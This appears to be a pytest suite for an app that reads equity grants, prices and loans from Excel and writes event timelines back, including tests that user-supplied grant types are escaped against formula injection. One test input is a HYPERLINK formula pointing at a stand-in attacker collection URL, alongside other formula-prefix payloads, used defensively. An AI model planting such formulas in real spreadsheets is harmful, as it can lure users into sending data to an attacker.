import sys
import os
import pytest
import openpyxl

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app.excel_io import read_all_from_excel, read_grants_from_excel, read_prices_from_excel, read_loans_from_excel
from app.core import generate_all_events, compute_timeline

FIXTURE = os.path.join(os.path.dirname(__file__), "..", "..", "test_data", "fixture.xlsx")


@pytest.fixture()
def workbook():
    wb = openpyxl.load_workbook(FIXTURE)
    yield wb
    wb.close()


def test_read_grants_count(workbook):
    assert len(read_grants_from_excel(workbook["Schedule"])) == 12


def test_read_prices_count(workbook):
    assert len(read_prices_from_excel(workbook["Prices"])) == 8


def test_read_loans_count(workbook):
    assert len(read_loans_from_excel(workbook["Loans"])) == 21


def test_read_all_initial_price():
    grants, prices, loans, initial_price = read_all_from_excel(FIXTURE)
    assert initial_price == prices[0]["price"]
    assert initial_price > 0


def test_grant_fields(workbook):
    g = read_grants_from_excel(workbook["Schedule"])[0]
    assert isinstance(g["year"], int)
    assert isinstance(g["type"], str)
    assert isinstance(g["shares"], int)
    assert isinstance(g["price"], float)
    assert isinstance(g["periods"], int)
    assert g["vest_start"] is not None
    assert g["exercise_date"] is not None


def test_loan_fields(workbook):
    loan = read_loans_from_excel(workbook["Loans"])[0]
    assert isinstance(loan["amount"], float)
    assert isinstance(loan["interest_rate"], float)
    assert loan["loan_type"] in ("Purchase", "Interest", "Tax")
    assert loan["due"] is not None


def test_price_fields(workbook):
    p = read_prices_from_excel(workbook["Prices"])[0]
    assert isinstance(p["price"], float)
    assert p["date"] is not None


def test_roundtrip_generates_correct_events():
    grants, prices, loans, initial_price = read_all_from_excel(FIXTURE)
    events = generate_all_events(grants, prices, loans)
    timeline = compute_timeline(events, initial_price)
    assert len(events) == 89
    assert timeline[-1]["cum_shares"] == 558500


# ── Writer: formula injection ────────────────────────────────────────────────

def _event(**over):
    from datetime import datetime
    evt = {
        "date": datetime(2021, 1, 1), "grant_year": 2021, "grant_type": "Purchase",
        "event_type": "Grant", "granted_shares": 100, "grant_price": 1.0,
        "exercise_price": 0.0, "vested_shares": 0, "price_increase": 0.0,
        "source": None,
    }
    evt.update(over)
    return evt


def _write_one(tmp_path, evt):
    import shutil
    from app.excel_io import write_events_to_excel
    path = str(tmp_path / "out.xlsx")
    shutil.copy(FIXTURE, path)
    write_events_to_excel(path, [evt], [])
    wb = openpyxl.load_workbook(path)
    try:
        return wb["Events"]["C2"], wb["Events"]["I2"]
    finally:
        wb.close()


@pytest.mark.parametrize("grant_type", [
    '=HYPERLINK("https://attacker.example/collect","Open")',
    '+1+1',
    '-1+1',
    '@SUM(A1)',
])
def test_user_grant_type_never_becomes_a_formula(tmp_path, grant_type):
    """A grant type is user input: it is written as text whatever it starts with."""
    cell, _ = _write_one(tmp_path, _event(grant_type=grant_type))
    assert cell.data_type != "f"
    assert cell.value == "'" + grant_type


def test_ordinary_grant_type_is_written_unchanged(tmp_path):
    cell, _ = _write_one(tmp_path, _event(grant_type="Purchase"))
    assert cell.value == "Purchase"


def test_server_formulas_are_still_formulas(tmp_path):
    """The cumulative-shares column stays a live formula."""
    _, cum = _write_one(tmp_path, _event())
    assert cum.data_type == "f"
    assert cum.value == "=SUM(H$1:H2)"
